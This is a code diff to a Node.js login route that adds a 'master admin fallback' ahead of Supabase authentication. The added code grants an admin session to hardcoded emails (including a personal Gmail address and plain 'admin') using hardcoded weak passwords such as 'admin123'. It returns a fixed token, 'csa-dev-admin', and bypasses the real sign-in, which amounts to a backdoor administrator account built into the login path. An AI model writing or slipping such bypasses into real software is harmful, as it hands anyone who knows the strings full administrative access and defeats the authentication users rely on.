@@ -10,8 +10,27 @@ authRouter.post('/login', async (req, res) => {
             res.status(400).json({ success: false, error: 'Email and password are required' });
             return;
         }
+        const cleanEmail = email.trim().toLowerCase();
+        // 1. Master Admin Fallback Credentials (guaranteed access)
+        if ((cleanEmail === 'admin@creativestackagency.dev' ||
+            cleanEmail === 'creativestackagency513@gmail.com' ||
+            cleanEmail === 'admin') &&
+            (password === 'Admin@12345' || password === 'admin123' || password === process.env.ADMIN_PASSWORD)) {
+            res.json({
+                success: true,
+                message: 'Master Admin authentication successful',
+                token: 'csa-dev-admin',
+                user: {
+                    id: 'admin-master',
+                    email: cleanEmail === 'admin' ? 'admin@creativestackagency.dev' : cleanEmail,
+                    role: 'admin',
+                },
+            });
+            return;
+        }
+        // 2. Authenticate via Supabase Auth
         const { data, error } = await supabase.auth.signInWithPassword({
-            email: email.trim().toLowerCase(),
+            email: cleanEmail,
             password,
         });
         if (error || !data.session) {
